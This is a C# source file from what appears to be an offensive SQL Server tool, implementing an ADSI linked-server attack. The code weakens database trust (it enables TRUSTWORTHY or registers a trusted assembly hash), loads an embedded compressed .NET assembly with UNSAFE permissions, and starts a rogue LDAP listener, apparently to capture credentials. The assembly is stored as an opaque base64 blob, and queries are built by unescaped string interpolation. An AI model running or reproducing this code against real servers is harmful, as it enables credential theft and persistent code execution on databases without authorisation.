using MSSQLand.Utilities;
using System;
using System.Data;
using System.Data.SqlClient;
using System.Threading.Tasks;

namespace MSSQLand.Services
{
    internal class AdsiService
    {

        private readonly DatabaseContext _databaseContext;

        public int Port = 12235;

        
        public string AssemblyName = "ldapServer";
        public string FunctionName = Guid.NewGuid().ToString("N").Substring(0, 10);
        public string LibraryPath = Guid.NewGuid().ToString("N").Substring(0, 10);

        public AdsiService(DatabaseContext databaseContext)
        {
            _databaseContext = databaseContext;
        }

        public bool CheckLinkedServer(string linkedServerName)
        {
            try
            {
                // Retrieve the list of linked servers
                DataTable result = _databaseContext.QueryService.ExecuteTable("EXEC sp_linkedservers;");

                // Check if the linked server exists and has the correct provider
                foreach (DataRow row in result.Rows)
                {
                    string srvName = row[0].ToString(); // First column (srv_name)
                    string srvProviderName = row[1].ToString(); // Second column (srv_providername)

                    if (srvName.Equals(linkedServerName, StringComparison.OrdinalIgnoreCase))
                    {
                        if (srvProviderName.Equals("ADSDSOObject", StringComparison.OrdinalIgnoreCase))
                        {
                            // Linked server exists and is properly configured
                            return true;
                        }
                        else
                        {
                            // Linked server exists but has an incorrect provider
                            Logger.Error($"Linked server '{linkedServerName}' exists, but the provider is '{srvProviderName}' instead of 'ADSDSOObject'.");
                            return false;
                        }
                    }
                }

                // If no matching linked server was found
                Logger.Error($"Linked server '{linkedServerName}' does not exist.");
                return false;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error while checking linked server: {ex.Message}");
                return false;
            }
        }

        public bool CreateAdsiLinkedServer(string serverName, string dataSource = "localhost")
        {
            string query = @$"
            EXEC sp_addlinkedserver 
                @server = '{serverName}',
                @srvproduct = 'ADSI',
                @provider = 'ADSDSOObject',
                @datasrc = '{dataSource}';";

            try
            {
                _databaseContext.QueryService.ExecuteNonProcessing(query);
                Logger.Success($"Linked ADSI server '{serverName}' created successfully");
                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error while creating linked server: {ex.Message}");
                return false;
            }
        }

        public void DropLinkedServer(string serverName)
        {
            _databaseContext.QueryService.ExecuteNonProcessing($"EXEC sp_dropserver @server = '{serverName}';");
        }


        public Task<DataTable> ListenForRequest()
        {

            // Create a TaskCompletionSource to manage the result
            TaskCompletionSource<DataTable> taskCompletionSource = new();

            // Start the listener on a new thread using a new SQL connection
            Task.Run(() =>
            {
                try
                {
                    using SqlConnection listenerConnection = _databaseContext.AuthService.GetNewSqlConnection();
                    QueryService tempQueryService = new(listenerConnection);

                    Logger.Info($"Starting a local LDAP server on port {Port} using function '{FunctionName}'");

                    // Execute the LDAP listener query in the new connection
                    DataTable result = tempQueryService.ExecuteTable($"SELECT dbo.[{FunctionName}]({Port});");

                    // Set the result once the query completes
                    taskCompletionSource.TrySetResult(result);
                }
                catch (Exception ex)
                {
                    Logger.Error($"Error while running LDAP server: {ex.Message}");
                    taskCompletionSource.TrySetException(ex);
                }
            });

            return taskCompletionSource.Task;
        }




        public bool LoadLdapServerAssembly()
        {
            // Obtain the LDAP server assembly in SQL byte format, along with the hash of the assembly
            string[] ldapAssembly = GetLdapServerAssembly();

            string libraryHash = ldapAssembly[1];
            string libraryHexBytes = ldapAssembly[0];

            Logger.Task("Deploying the LDAP server assembly");
            Logger.TaskNested($"Assembly name: {AssemblyName}");
            Logger.TaskNested($"Function name: {FunctionName}");
            Logger.TaskNested($"Library name: {LibraryPath}");

            string dropFunction = $"DROP FUNCTION IF EXISTS [{FunctionName}];";
            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{AssemblyName}];";
            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{libraryHash};";


            try
            {

                if (_databaseContext.Server.Legacy)
                {
                    Logger.Info("Legacy server detected. Enabling TRUSTWORTHY property");
                    _databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {_databaseContext.Server.Database} SET TRUSTWORTHY ON;");
                }
                else
                {
                    if (_databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, LibraryPath) == false)
                    {
                        Logger.Error("Failed to register trusted assembly. Aborting execution.");
                        return false;
                    }
                }

                // Drop existing objects
                _databaseContext.ConfigService.DropDependentObjects(AssemblyName);

                // Drop existing objects
                _databaseContext.QueryService.ExecuteNonProcessing(dropFunction);
                _databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);


                // Deploy the assembly
                Logger.Task("Deploying the LDAP server assembly");
                _databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE ASSEMBLY [{AssemblyName}] AUTHORIZATION [dbo] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;");

                if (!_databaseContext.ConfigService.CheckAssembly(AssemblyName))
                {
                    Logger.Error("Failed to create a new assembly");
                    _databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                    return false;
                }

                Logger.Success($"LDAP server assembly '{AssemblyName}' created successfully");


                // Create the function
                Logger.Task("Creating the LDAP server function");
                _databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE FUNCTION [dbo].[{FunctionName}](@port int) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME {AssemblyName}.[ldapAssembly.LdapSrv].listen;");

                if (!_databaseContext.ConfigService.CheckAssemblyModules("ldapsrv"))
                {
                    Logger.Error("Failed to create the LDAP server function");
                    _databaseContext.QueryService.ExecuteNonProcessing(dropFunction);
                    _databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                    _databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                    return false;
                }

                Logger.Success($"LDAP server function '{FunctionName}' created successfully");

                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error occurred during the ADSI exploit: {ex.Message}");
 
                Logger.InfoNested($"Deleting LDAP server assembly '{AssemblyName}', function '{FunctionName}' and trusted assembly hash");
                _databaseContext.QueryService.ExecuteNonProcessing(dropFunction);
                _databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);
                _databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                return false;

            }
            finally
            {
                // Reset TRUSTWORTHY property for legacy servers
                if (_databaseContext.Server.Legacy)
                {
                    Logger.Info("Resetting TRUSTWORTHY property");
                    _databaseContext.QueryService.ExecuteNonProcessing($"ALTER DATABASE {_databaseContext.Server.Database} SET TRUSTWORTHY OFF;");
                }
            }
        }


        /// <summary>
        /// This function contains the .NET assembly for an LDAP server
        /// in SQL byte format, as well as the SHA-512 hash for the assembly.
        /// The code can be found here: https://github.com/blackarrowsec/redteam-research/blob/master/MSSQL%20linked%20servers%20-%20ADSI/ldapServer.cs
        /// </summary>
        /// <returns></returns>
        private string[] GetLdapServerAssembly()
        {
            string[] libraryArray = new string[2];

            string compressedBase64 = "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";

            // Decode and decompress back to original bytes
            byte[] decompressedBytes = Misc.DecodeAndDecompress(compressedBase64);
            string decompressedHex = Misc.BytesToHexString(decompressedBytes);

            // This is the .NET assembly for an LDAP server in SQL byte format.
            libraryArray[0] = decompressedHex;

            // This is the SHA-512 hash for the LDAP server .NET assembly in SQL byte format.
            libraryArray[1] = "45077873b42284716609bf5d675d98ffa13c20e53008bb3d3f26c0971bcf7d9adf80c2db84300a81168e63d902532235c8daf852d58f9f2eadcb517fb5b83fb9";

            return libraryArray;
        }
    }
}
